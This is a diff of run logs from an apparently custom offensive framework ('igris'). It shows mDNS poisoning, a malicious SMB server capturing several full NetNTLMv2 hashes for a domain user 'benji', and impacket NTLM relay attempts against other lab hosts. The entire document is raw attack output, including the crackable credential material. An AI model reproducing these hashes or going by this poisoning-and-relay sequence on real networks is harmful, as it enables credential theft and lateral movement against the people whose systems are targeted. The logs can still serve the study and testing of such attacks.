-2021-10-19 11:11:59.357 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
-2021-10-19 11:11:59.357 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
-2021-10-19 11:11:59.554 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 11:11:59.554 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 11:19:07.215 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 11:19:15.178 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57431)
-2021-10-19 11:19:15.181 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57431)
-2021-10-19 11:19:29.264 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 11:19:37.012 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57432)
-2021-10-19 11:19:37.015 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57432)
+2021-10-20 15:27:29.497 | SUCCESS  | project.smb.scan:__set_up_scan_actions_synchronous:520 - Synchronous scanning has been completed
+2021-10-20 15:29:18.992 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 15:29:19.005 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:46 - Starting Malicious SMB Server ...
+2021-10-20 15:46:38.026 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 15:46:38.039 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:178 - Starting mdns poisoning...
+2021-10-20 15:46:38.045 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:46 - Starting Malicious SMB Server ...
+2021-10-20 15:46:54.702 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to 192.168.253.130[0m
+2021-10-20 15:46:54.740 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-10-20 15:46:55.683 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,63787)
+2021-10-20 15:46:55.703 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-20 15:46:55.704 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-20 15:46:55.704 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:ed35c5556328d3bef87bca012f9f36d9:0101000000000000808135b5c9c5d701a58d0d1eeb8a8d2f0000000001001000530076004f005200560058005800620003001000530076004f00520056005800580062000200100062007400590051006600630071006c000400100062007400590051006600630071006c0007000800808135b5c9c5d70106000400020000000800300030000000000000000000000000200000e0827650888adf25a147ceca46a18187a24acadd455b897bc746a69fbe5ccf910a001000000000000000000000000000000000000900200063006900660073002f0070006500720072006f002e006c006f00630061006c000000000000000000
+2021-10-20 15:46:55.755 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-20 15:48:14.266 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 15:48:14.279 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:178 - Starting mdns poisoning...
+2021-10-20 15:48:14.283 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:46 - Starting Malicious SMB Server ...
+2021-10-20 15:48:18.723 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to 192.168.253.130[0m
+2021-10-20 15:48:18.758 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-10-20 15:48:19.723 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,63792)
+2021-10-20 15:48:19.751 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-20 15:48:19.751 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-20 15:48:19.752 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:a5cd91e442a646817c694a67a201cca0:010100000000000080e346e7c9c5d70176994bcec3771d2700000000010010006f007a00620062005800670066004c00030010006f007a00620062005800670066004c00020010005400520054007a004f004d0066004400040010005400520054007a004f004d00660044000700080080e346e7c9c5d70106000400020000000800300030000000000000000000000000200000e0827650888adf25a147ceca46a18187a24acadd455b897bc746a69fbe5ccf910a001000000000000000000000000000000000000900200063006900660073002f0070006500720072006f002e006c006f00630061006c000000000000000000
+2021-10-20 15:48:19.773 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-20 15:48:30.029 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-20 15:48:30.038 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,63792)
+2021-10-20 15:48:30.042 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-20 15:49:21.280 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 15:49:21.294 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:178 - Starting mdns poisoning...
+2021-10-20 15:49:21.296 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:46 - Starting Malicious SMB Server ...
+2021-10-20 15:49:24.831 | WARNING  | scapy.error:warning:150 - Calling str(pkt) on Python 3 makes no sense!
+2021-10-20 15:49:24.834 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to 192.168.253.130[0m
+2021-10-20 15:49:24.880 | WARNING  | scapy.error:warning:150 - Calling str(pkt) on Python 3 makes no sense!
+2021-10-20 15:49:24.884 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-10-20 15:49:24.927 | WARNING  | scapy.error:warning:150 - more Calling str(pkt) on Python 3 makes no sense!
+2021-10-20 15:49:25.716 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,63794)
+2021-10-20 15:49:25.747 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-20 15:49:25.748 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-20 15:49:25.749 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:29707774d4078c7890cdd0ef9d05f4d6:010100000000000080b09d0ecac5d701f3754fbf4068098500000000010010007a005700510061004800620075006500030010007a0057005100610048006200750065000200100049006a006200750069004700790077000400100049006a006200750069004700790077000700080080b09d0ecac5d70106000400020000000800300030000000000000000000000000200000e0827650888adf25a147ceca46a18187a24acadd455b897bc746a69fbe5ccf910a001000000000000000000000000000000000000900200063006900660073002f0070006500720072006f002e006c006f00630061006c000000000000000000
+2021-10-20 15:49:25.773 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-20 15:51:04.532 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 15:51:04.542 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:178 - Starting mdns poisoning...
+2021-10-20 15:51:04.543 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:46 - Starting Malicious SMB Server ...
+2021-10-20 15:51:08.027 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to 192.168.253.130[0m
+2021-10-20 15:51:08.067 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-10-20 15:51:09.032 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,60803)
+2021-10-20 15:51:09.056 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-20 15:51:09.057 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-20 15:51:09.058 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:a019530a395466b2da57ddf1fa2cc3f6:010100000000000080d49a4ccac5d701d72bc274cf7044ab00000000010010006400760074005a004300450073004d00030010006400760074005a004300450073004d000200100052006c0066005200460048006a005a000400100052006c0066005200460048006a005a000700080080d49a4ccac5d70106000400020000000800300030000000000000000000000000200000e0827650888adf25a147ceca46a18187a24acadd455b897bc746a69fbe5ccf910a001000000000000000000000000000000000000900200063006900660073002f0070006500720072006f002e006c006f00630061006c000000000000000000
+2021-10-20 15:51:09.083 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-20 15:51:19.791 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-20 15:51:19.796 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,60803)
+2021-10-20 15:51:19.797 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-20 16:42:58.059 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 16:42:58.083 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:178 - Starting mdns poisoning...
+2021-10-20 16:42:58.092 | INFO     | project.ManInTheMiddle.servers.smbserver:start_ntlm_relay_server:96 - Starting ntlm-relay attack...
+2021-10-20 16:42:58.126 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
+2021-10-20 16:43:20.125 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to 192.168.253.130[0m
+2021-10-20 16:43:20.165 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-10-20 16:43:21.610 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-5: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.134
+2021-10-20 16:43:21.623 | ERROR    | impacket.examples.ntlmrelayx.clients.smbrelayclient:negotiateSession:106 - Signing is required, attack won't work unless using -remove-target / --remove-mic
+2021-10-20 16:43:21.652 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.134 as RSGBENGICORP/BENJI SUCCEED
+2021-10-20 16:43:21.656 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-5: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-10-20 16:43:21.721 | ERROR    | impacket.examples.ntlmrelayx.attacks.smbattack:run:96 - SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+2021-10-20 16:43:28.631 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to 192.168.253.130[0m
+2021-10-20 16:43:28.681 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-10-20 16:43:29.650 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-10-20 16:44:37.826 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 16:44:37.832 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:178 - Starting mdns poisoning...
+2021-10-20 16:44:37.836 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:52 - Starting Malicious SMB Server ...
+2021-10-20 16:44:38.537 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:94 - Exiting smb relay attack ...
+2021-10-20 16:44:50.161 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 16:44:50.176 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:178 - Starting mdns poisoning...
+2021-10-20 16:44:50.181 | INFO     | project.ManInTheMiddle.servers.smbserver:start_ntlm_relay_server:96 - Starting ntlm-relay attack...
+2021-10-20 16:44:50.206 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
+2021-10-20 16:44:58.963 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to 192.168.253.130[0m
+2021-10-20 16:44:58.994 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-10-20 16:44:59.996 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.134
+2021-10-20 16:45:00.009 | ERROR    | impacket.examples.ntlmrelayx.clients.smbrelayclient:negotiateSession:106 - Signing is required, attack won't work unless using -remove-target / --remove-mic
+2021-10-20 16:45:00.020 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.134 as RSGBENGICORP/BENJI SUCCEED
+2021-10-20 16:45:00.027 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-10-20 16:45:00.030 | ERROR    | impacket.examples.ntlmrelayx.attacks.smbattack:run:96 - SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+2021-10-20 16:45:01.047 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to 192.168.253.130[0m
+2021-10-20 16:45:01.088 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-10-20 16:45:08.474 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:174 - Exiting smb relay attack ...
+2021-10-20 16:45:17.087 | INFO     | project.igris:show_settable_variables_necessary:218 - Showing necessary settable variables
+2021-10-20 16:57:50.749 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 16:57:50.760 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:178 - Starting mdns poisoning...
+2021-10-20 16:57:50.768 | INFO     | project.ManInTheMiddle.servers.smbserver:start_ntlm_relay_server:96 - Starting ntlm-relay attack...
+2021-10-20 16:57:50.791 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
+2021-10-20 16:58:07.056 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to 192.168.253.130[0m
+2021-10-20 16:58:07.275 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:140 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-10-20 16:58:08.253 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.130
+2021-10-20 16:58:09.025 | ERROR    | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:313 - Authenticating against smb://192.168.253.130 as RSGBENGICORP/BENJI FAILED
+2021-10-20 16:58:12.733 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:174 - Exiting smb relay attack ...
